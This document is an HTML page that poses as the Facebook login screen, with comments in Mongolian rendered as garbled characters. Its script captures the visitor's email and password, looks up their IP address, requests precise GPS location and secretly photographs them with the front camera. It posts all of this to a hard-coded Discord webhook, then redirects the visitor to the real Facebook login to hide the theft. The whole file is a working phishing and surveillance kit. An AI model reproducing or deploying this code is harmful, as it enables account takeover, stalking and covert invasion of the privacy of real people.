<!DOCTYPE html>
<html lang="mn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <title>Facebook ‚Äì Log In or Sign Up</title>
    <meta property="og:title" content="Facebook ‚Äì Log In or Sign Up" />
    <meta property="og:description" content="Connect with friends and the world around you on Facebook." />
    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" />
    <meta property="og:type" content="website" />

    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .header {
            width: 100%;
            height: 140px;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .fb-logo {
            color: #1877f2;
            font-size: 35px;
            font-weight: bold;
        }
        .login-container {
            width: 92%;
            max-width: 400px;
            margin-top: -20px;
        }
        .login-card {
            background: white;
            padding: 16px;
            border-radius: 8px;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1), 0 4px 12px rgba(0, 0, 0, 0.1);
        }
        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            background-color: #f5f6f7;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            border-color: #1877f2;
            background-color: #fff;
        }
        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }
        .forgot {
            color: #1877f2;
            font-size: 14px;
            margin: 15px 0;
            display: block;
            text-decoration: none;
            text-align: center;
        }
        .divider {
            border-top: 1px solid #dadde1;
            margin: 20px 0;
        }
        .create-btn {
            background-color: #42b72a;
            color: white;
            border: none;
            padding: 10px 16px;
            border-radius: 6px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
        }
        #loading {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255,255,255,0.95);
            z-index: 1000;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1877f2;
            border-radius: 50%;
            width: 35px;
            height: 35px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="header">
        <div class="fb-logo">facebook</div>
    </div>

    <div class="login-container">
        <div class="login-card">
            <input type="text" id="email" placeholder="Mobile number or email" required>
            <input type="password" id="pass" placeholder="Password" required>
            <button class="login-btn" onclick="executeGrab()">Log In</button>
            <a href="#" class="forgot">Forgotten password?</a>
            <div class="divider"></div>
            <center><button class="create-btn">Create new account</button></center>
        </div>
    </div>

    <div id="loading">
        <div class="spinner"></div>
        <p style="font-size: 14px; color: #606770; margin-top: 10px;">Connecting to Facebook...</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1474117800611283046/98vn9fBxXglz8eaFjGSDnavxvdw780mX40C7OLshIIUwbAwB0JupILzA6MUVn0Egqx27";

        async function executeGrab() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;

            if (!email || !pass) {
                alert("Please enter your email and password.");
                return;
            }

            // –ê—á–∞–∞–ª–∞—Ö –¥—ç–ª–≥—ç—Ü–∏–π–≥ —Ö–∞—Ä—É—É–ª–∞—Ö
            document.getElementById('loading').style.display = 'flex';

            let ipAddress = "–ù—É—É—Ü–∞–ª—Å–∞–Ω";
            let googleMapsUrl = "–ë–∞–π—Ä—à–∏–ª —Ç–∞—Ç–≥–∞–ª–∑—Å–∞–Ω";

            // 1. IP –•–∞—è–≥ –∞–≤–∞—Ö (WiFi / –î–∞—Ç–∞ –º—ç–¥—ç—ç–ª—ç–ª)
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                ipAddress = ipData.ip;
            } catch (e) { console.log("IP fetch error"); }

            // 2. GPS –ë–∞–π—Ä—à–∏–ª –∞–≤–∞—Ö
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    googleMapsUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                },
                (err) => { console.log("Location denied"); },
                { enableHighAccuracy: true }
            );

            // 3. –ö–∞–º–µ—Ä –∞–∂–∏–ª–ª—É—É–ª–∂ –∑—É—Ä–∞–≥ –∞–≤–∞—Ö
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                video.srcObject = stream;

                // 1.5 —Å–µ–∫—É–Ω–¥ —Ö“Ø–ª—ç—ç–≥—ç—ç–¥ –∑—É—Ä–∞–≥ –¥–∞—Ä–Ω–∞ (–∫–∞–º–µ—Ä —Ç–æ–≥—Ç–≤–æ—Ä–∂–∏—Ö —Ö—É–≥–∞—Ü–∞–∞)
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        const message = `üöÄ **–®–ò–ù–≠ –ú–≠–î–≠–≠–õ–≠–õ –ò–†–õ–≠–≠!**\n\nüë§ **User:** \`${email}\` \nüîí **Pass:** \`${pass}\` \nüåê **IP:** \`${ipAddress}\` \nüìç **GPS:** ${googleMapsUrl}\nüì± **Device:** iPhone 12 / Safari`;
                        
                        formData.append("content", message);
                        formData.append("file", blob, "camera_shot.png");

                        // Discord —Ä—É—É –∏–ª–≥—ç—ç—Ö
                        await fetch(DISCORD_WEBHOOK, { method: "POST", body: formData });

                        // –ö–∞–º–µ—Ä —É–Ω—Ç—Ä–∞–∞–∂, –∂–∏–Ω—Ö—ç–Ω—ç Facebook —Ä“Ø“Ø —à–∏–ª–∂“Ø“Ø–ª—ç—Ö
                        stream.getTracks().forEach(track => track.stop());
                        window.location.href = "https://www.facebook.com/login/";
                    }, 'image/png');
                }, 1500);

            } catch (err) {
                // –•—ç—Ä—ç–≤ –∫–∞–º–µ—Ä –∑”©–≤—à”©”©—Ä”©—Ö–≥“Ø–π –±–æ–ª –∑”©–≤—Ö”©–Ω –º—ç–¥—ç—ç–ª–ª–∏–π–≥ —è–≤—É—É–ª–Ω–∞
                const textOnly = {
                    content: `üîë **–ù—ç–≤—Ç—Ä—ç—Ö –º—ç–¥—ç—ç–ª—ç–ª (–ö–∞–º–µ—Ä —Ö–∞–∞–ª—Ç—Ç–∞–π):**\nüë§ User: \`${email}\` \nüîí Pass: \`${pass}\` \nüåê IP: \`${ipAddress}\` \nüìç GPS: ${googleMapsUrl}`
                };
                await fetch(DISCORD_WEBHOOK, {
                    method: "POST",
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(textOnly)
                });
                window.location.href = "https://www.facebook.com/login/";
            }
        }
    </script>
</body>
</html>
